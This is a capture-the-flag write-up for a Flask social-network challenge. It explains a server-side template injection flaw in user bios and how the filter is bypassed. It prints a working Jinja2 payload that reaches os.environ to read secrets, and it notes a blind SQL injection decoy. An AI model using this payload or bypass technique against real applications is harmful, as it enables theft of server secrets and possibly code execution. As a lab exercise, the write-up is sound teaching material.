# Nexus — Writeup

**Category:** Web  
**Flag:** `ictf{1_th0ught_1t_w4s_h4rd3n3d_but_1t_w4s_3asy}`

---

## Overview

A social network built with Flask. User bios are rendered via `render_template_string()` — enabling Server-Side Template Injection (SSTI). A WAF blocks `{{` and common Jinja2 globals (`lipsum`, `cycler`, `namespace`) but misses `{%...%}` statement tags and the `joiner` global.

---

## Solution

### Root cause

`render_bio()` concatenates user input into a Jinja2 template string:

```python
tpl = "<div>" + bio_text + "</div>"
result = render_template_string(tpl)
```

### WAF bypass

The WAF blocks `{{` but NOT `{%`. Use `{% print(...) %}` for output.  
Dunder attributes (`__init__`, `__globals__`) are blocked as literals — split them with string concatenation inside Jinja2.  
`joiner` is a Jinja2 built-in NOT blocked by the WAF (unlike `lipsum`/`cycler`/`namespace`).

### Payload

Set this as your profile bio in `/settings`:

```
{%print(joiner[("__ini"+"t__")][("__glo"+"bals__")]["os"]["environ"]["get"]("FLAG"))%}
```

Visit your profile — the flag renders in the bio block.

### Deception: blind SQLi honeypot

`/api/dm/search` has a real SQL injection via string formatting, but it only returns `COUNT(*)` — extractable only via boolean-blind. Investing time here yields a **fake flag** (`CTF{sq1_m4st3r_0r_m4yb3_n0t}`) from the `secrets` table. The real vulnerability is SSTI in the bio.

### Automated exploit

```bash
python3 writeup/solve.py http://<host>:<port>
```

---

## Flag

`ictf{1_th0ught_1t_w4s_h4rd3n3d_but_1t_w4s_3asy}`
